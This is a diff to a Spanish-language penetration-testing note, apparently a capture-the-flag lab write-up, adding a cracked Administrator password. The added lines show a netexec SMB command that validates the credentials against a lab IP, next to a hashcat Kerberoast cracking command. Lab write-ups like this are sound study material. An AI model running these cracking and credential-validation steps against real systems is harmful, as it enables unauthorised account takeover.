@@ -127,3 +127,12 @@ EL `hash` obtenido lo pasamos a un fichero y podemos crackearlo usando [[HASHCAT
 hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
 ```
 
+Obteniendo como contraseña `Ticketmaster1968`
+Validamos que las credenciales son correctas con [[NETEXEC]]
+ ```shell
+ nxc smb 10.129.9.24 -u "Administrator" -p "Ticketmaster1968"
+ ```
+
+```ad-hint
+Administrator::Ticketmaster1968
+```
